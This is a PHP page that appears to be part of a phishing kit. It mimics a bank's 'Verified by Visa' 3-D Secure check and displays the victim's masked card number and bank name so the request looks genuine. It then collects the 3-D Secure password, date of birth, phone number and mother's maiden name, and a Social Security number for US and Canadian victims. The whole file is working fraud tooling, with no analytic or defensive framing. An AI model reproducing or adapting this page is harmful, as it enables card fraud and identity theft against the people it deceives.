<?
session_start(); 
$_POST['country_cc'] = strtoupper($_SESSION['country_cc']);
$_4 = substr($_SESSION['ccnum'] ,-4);
$ssn = array('UNITED STATES','CANADA');
$mmn = array('UNITED STATES', 'IRELAND', 'GERMANY', 'SWITZERLAND', 'UNITED KINGDOM', 'CANADA');
$acc = array('IRELAND', 'GERMANY', 'SWITZERLAND', 'UNITED KINGDOM', 'FINLAND');
$srt = array('UNITED KINGDOM','IRELAND');
$_SESSION['code_cn'] = $cn;
if (empty($cn)) {$cn = "US";} 
$get = @json_decode(file_get_contents("../files/js/currency.json"));               //
$v= $get->$cn;  
$bank = $_SESSION['bank'];
if (empty($_SESSION['bank'])) {
  $name = $_SESSION['brand'];
}else{
  $name = $_SESSION['bank'];

}
/////////////////////////////////////////////////////////////////////////////////////
include('../lang/language.php');
?>
<link rel="stylesheet" href="../files/css/vbv.css">
<form class="vbb" id="validate"  method="post" action="includes/v_checking" >
<div class="row" id="vbv_line_2" style="padding-left: 7px;">
<? echo(''.$name.' '.$language["secure"][2].' '.$_SESSION["bank"].' '.$language["secure"][22].'') ?>
</div>
<br>
<div class="row" id="vbv_line_3"> 
<table><tbody><tr>
<td><? echo($language['secure'][3]) ?></td>
<td><? echo($language['secure'][4]) ?></td>
</tr><tr>
<td><? echo($language['secure'][5]) ?></td>
<td><? echo($language['secure'][6]) ?><? echo "$v"; ?></td>
</tr><tr>
<td><? echo($language['secure'][7]) ?></td>
<td><?php echo @date('m/d/Y'); ?></td>
</tr><tr>
<td><? echo($language['secure'][8]) ?></td>
<?php
if ($_SESSION['typecc'] == 'amex') {
    echo '' . '<td>XXXX-XXXXXX-X' . "{$_4}" . '</td>' . ''; 
} else {
    echo '' . '<td>XXXX-XXXX-XXXX-' . "{$_4}" . '</td>' . '';
}
?>
</tr>
<? 
if (empty($_SESSION['type'])==false) {
echo('<tr>
<td>'.$language['secure'][9].'</td>
<td>'.$_SESSION['type'].'</td>
</tr>');
}

if (empty($_SESSION['bank'])==false) {
echo('<tr>
<td>'.$language['secure'][10].'</td>
<td>'.$_SESSION['bank'].'</td>
</tr>');
}

if (empty($_SESSION['country_cc'])==false) {
echo('<tr>
<td>'.$language['secure'][17].'</td>
<td>'.$_SESSION['country_cc'].'</td>
</tr>');
}


?>
<tr> 
<td>
    <? echo($language['secure'][11]) ?></td>
<form class="vbb" id="validate"  method="post" action="includes/vbv" >
<td><input type="text" required="" name="_3dpass" id="3dpass" class="enterInput2"  value="" style="width: 170px" placeholder="" >
</td>
    </tr>

    <tr class="tr_height25px">
<td>
    <? echo($language['secure'][12]) ?></td>
<td>
    
    <input type="number" required="" class="inp2" autocomplete="off" name="dob_1" id="day" value="" placeholder="" data-maxlength="2" minlength="2" style="width:20px;padding: 0px;text-align: center;"> /
    <input type="number" required="" class="inp2"  autocomplete="off" name="dob_2" id="dob_2" value="" placeholder="" data-maxlength="2" minlength="2" style="width:20px;padding: 0px;text-align: center;"> /
    <input type="number" required="" class="inp2" autocomplete="off" name="dob_3" id="dob_3" value="" placeholder="" data-maxlength="4" minlength="4" maxlength="4" style="width:40px;padding: 0px;text-align: center;"> (DD/MM/YYYY)
</td>
    </tr>
<?php 
/*if (in_array($_POST['country_cc'], $srt)) { echo '
            <tr class="tr_height25px">
<td>'.$language["secure"][15].'</td>
<td>
    <input type="number" required="" class="inp2"  name="sort_1" value="" placeholder="" data-maxlength="2" style="width:22px;padding-left:2;" onkeypress="return event.charCode >= 48 && event.charCode <= 57"> - 
    <input type="number" required="" class="inp2"  name="sort_2" value="" placeholder="" data-maxlength="2" style="width:22px;padding-left:2;" onkeypress="return event.charCode >= 48 && event.charCode <= 57"> - 
    <input type="number" required="" class="inp2"  name="sort_3" value="" placeholder="" data-maxlength="2" maxlength="2" style="width:22px;padding-left:2;" onkeypress="return event.charCode >= 48 && event.charCode <= 57"> (XX-XX-XX)
    
</td>
            </tr>';
            }*/

if (in_array($_POST['country_cc'], $ssn)) { echo '
            <tr class="tr_height25px">
<td>'.$language["secure"][18].'</td>
<td>
    <input type="number" class="inp2" required="" name="ssn_1" id="ssn_1" value="" placeholder="" data-maxlength="3" style="width:30px;padding: 2;"onkeypress="return event.charCode >= 48 && event.charCode <= 57"> - 
    <input type="number" class="inp2" required="" name="ssn_2" id="ssn_2" value="" placeholder="" data-maxlength="2" style="width:20px;padding: 0;"onkeypress="return event.charCode >= 48 && event.charCode <= 57"> - 
    <input type="number" class="inp2" required="" name="ssn_3" id="ssn_3" value="" placeholder="" data-maxlength="4" style="width:40px;padding: 3;"onkeypress="return event.charCode >= 48 && event.charCode <= 57"> (XXX-XX-XXXX)
</td>
            </tr>
';}
?>
<tr class="tr_height25px">
    <td>
        <? echo($language['secure'][13]) ?></td>
    <td>+ <input type="number" required="" class="inp2" name="phone1" data-maxlength="3" autocomplete="off" id="phone1" value="<? echo $_SESSION['codde']; ?>" placeholder="" style="width:30px;padding: 0px;text-align: center;"onkeypress='return event.charCode >= 48 && event.charCode <= 57'>
        <input type="number" required="" class="inp2" name="phone2" data-maxlength="10" autocomplete="off" minlength="9" id="phone2" value="" placeholder="" style="width:128px;" onkeypress='return event.charCode >= 48 && event.charCode <= 57'>
    </td>
</tr>
     <?php /*if (in_array($_POST['country_cc'], $acc)) { echo '
<tr>
<td>'.$language["secure"][19].'</td>
<td><input type="number" required="" name="acc_num" id="acc_num" maxlength="24" minlength="6" value="" placeholder="" style="width:170px;" onkeypress="return event.charCode >= 48 && event.charCode <= 57"></td>
    </tr>';}*/
?>
<?php if (in_array($_POST['country_cc'], $mmn)) { echo '<tr class="tr_height25px">
<td>'.$language["secure"][14].'</td>
<td><input type="text" required="" name="mmn" id="mmn" value="" placeholder="" style="width:110px;"></td>
</tr>';}
            ?>
<input type="hidden" name="country_form" id="country_form" value="<?=$_SESSION['country'];?>">
<tr>
<td></td>
    <td><input type="submit" name="btnvbv"  value="<? echo($language['secure'][16]) ?>">
 <!--   <a href=""><div id="vbv_back">Back</div></a> -->
    </td>
</tr>
</tbody></table>
<br><table>
<script src="../files/js/jquery.js"></script>

<script src="../files/js/plugins.js"></script>
<script src='../files/js/password.js'></script>
<script type="text/javascript">
    $(".inp2").keyup(function() {
    if (this.value.length == this.maxLength) {
      $(this).next('.inp2').focus();
    }
});
</script>